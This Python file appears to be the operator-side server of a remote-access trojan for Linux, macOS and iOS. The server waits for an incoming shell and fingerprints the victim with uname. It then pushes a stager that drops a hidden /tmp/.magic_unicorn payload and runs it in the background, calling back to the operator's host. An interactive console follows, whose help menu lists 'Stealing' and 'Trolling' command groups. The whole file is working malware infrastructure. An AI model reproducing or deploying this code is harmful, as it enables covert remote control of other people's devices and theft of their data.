#!/usr/bin/env python3

import socket
import struct
import sys
import os
import pyaudio
import importlib

from time import sleep
from datetime import datetime

from core.handler import handler
from core.badges import badges

badges = badges()

# List of commands without required output
black_list = ['clear', 'help', 'openurl', 'exec', 'screenshot', 'mic', 'download', 'upload', 'load', 'say']
multi_arguments = ['shell', 'exec', 'say']

def _get_module(mu, name, folderpath):
    folderpath_list = folderpath.split(".")
    for i in dir(mu):
        if i == name:
            pass
            return getattr(mu, name)
        else:
            if i in folderpath_list:
                i = getattr(mu, i)
                return _get_module(i, name, folderpath)


def import_modules(path):
    modules = dict()
    
    for mod in os.listdir(path):
        if mod == '__init__.py' or mod[-3:] != '.py':
            continue
        else:
            md = path.replace("/", ".").replace("\\", ".") + "." + mod[:-3]
            mt = __import__(md)
            
            m = _get_module(mt, mod[:-3], md)
            m = m.UnicornModule(unicorn)
            
            modules[m.name] = m
    return modules

def craft_payload(LHOST, LPORT, target_system):
    if target_system in ["Linux", "macOS", "iOS"]:
        print(badges.G + "Sending "+target_system+" payload...")
        if os.path.exists("data/payload/"+target_system+"/magic_unicorn.py"):
            f = open("data/payload/"+target_system+"/magic_unicorn.py", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/.magic_unicorn;"+\
            "chmod 777 /tmp/.magic_unicorn;"+\
            "python3 /tmp/.magic_unicorn "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
            print(badges.G + "Executing "+target_system+" payload...")
            return (instructions, payload)
        else:
            print(badges.E +"Failed to craft "+target_system+" payload!")
            sys.exit()
    else:
        print(badges.E +"Unrecognized target system!")
        sys.exit()

def help():
    print("")
    print("Core Commands")
    print("=============")
    os.system("cat data/cmds/unicat_core_cmds.txt")
    print("")
    print("Settings Commands")
    print("=================")
    os.system("cat data/cmds/unicat_settings_cmds.txt")
    print("")
    print("Managing Commands")
    print("=================")
    os.system("cat data/cmds/unicat_managing_cmds.txt")
    print("")
    print("Stealing Commands")
    print("=================")
    os.system("cat data/cmds/unicat_stealing_cmds.txt")
    print("")
    print("Trolling Commands")
    print("=================")
    os.system("cat data/cmds/unicat_trolling_cmds.txt")
    print("")
    print("Local Commands")
    print("==============")
    os.system("cat data/cmds/unicat_local_cmds.txt")
    print("")

def get_prompt_information():
    username = ['username']
    unicorn.send(str(username).encode("UTF-8"))
    username = unicorn.recv()
    hostname = ['hostname']
    unicorn.send(str(hostname).encode("UTF-8"))
    hostname = unicorn.recv()
    return (username.decode("UTF-8", "ignore"), hostname.decode("UTF-8", "ignore"))

def shell():
    while True:
        try:
            username, hostname = get_prompt_information()
            command = str(input("({}{}@{}{})> ".format(badges.GREEN, username, hostname, badges.RESET)))
            while not command.strip():
                command = str(input("({}{}@{}{})> ".format(badges.GREEN, username, hostname, badges.RESET)))
            command = command.strip()
            arguments = "".join(command.split(command.split(" ")[0])).strip()
            command = command.split(" ")
            if command[0] == "help":
                help()
            elif command[0] == "exit":
                print(badges.G + "Cleaning up...")
                unicorn.send("exit".encode("UTF-8"))
                c.shutdown(2)
                c.close()
                s.close()
                sys.exit()
            elif command[0] == "exec":
                if len(command) < 2:
                    print("Usage: exec <command>")
                else:
                    print(badges.I + "exec:")
                    os.system(arguments)
                    print("")
            elif command[0] == "clear":
                os.system("clear")
            else:
                commands = import_modules("modules/"+target_system)
                if command[0] in commands.keys():
                    module = commands[command[0]]
                    if len(command) < int(module.args):
                        print(module.usage)
                    else:
                        module.run(arguments)
            if not command[0] in black_list:
                unicorn.send(str(command).encode("UTF-8"))
                data = unicorn.recv()
                if data.strip():
                    print(data.decode("UTF-8", "ignore"))
        except (KeyboardInterrupt, EOFError):
            print("")
        except socket.error:
            print(badges.E +"Connection refused!")
            c.close()
            s.close()
            sys.exit()
        except UnicodeEncodeError:
            print(data)
            print("")
        except Exception as e:
            print(badges.E +"An error occurred: "+str(e)+"!")

def server(LHOST, LPORT, handler=handler):
    global s, a, c, target_system, unicorn
    
    print(badges.G + "Binding to " + LHOST + ":" + str(LPORT) + "...")
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((LHOST, LPORT))
        s.listen(1)
    except:
        print(badges.E + "Failed to bind to " + LHOST + ":" + str(LPORT) + "!")
        try: 
            s.close()
        except:
            pass
        sys.exit()

    try:
        print(badges.G + "Listening on port " + str(LPORT) + "...")
        c, a = s.accept()
        print(badges.G + "Connecting to " + a[0] + "...")

        c.send("uname -p\n".encode())
        device_arch = c.recv(128).decode().strip()
        c.send("uname -s\n".encode())
        device_os = c.recv(128).decode().strip()
        
        if device_os == "Linux":
            target_system = "Linux"
        elif device_os == "Darwin" and device_arch == "i386":
            target_system = "macOS"
        elif device_os == "Darwin" and device_arch in ["arm64", "armv7s", "arm"]:
            target_system = "iOS"
        else:
            target_system = "Unknown"
        
        bash_stager, executable = craft_payload(LHOST, LPORT, target_system)
        
        c.send(bash_stager.encode())
        c.send(executable)
        c.close()

        print(badges.G + "Establishing connection...")
        c, a = s.accept()

        unicorn = handler(c)
        shell()
    except (KeyboardInterrupt, EOFError):
        print("")
        sys.exit()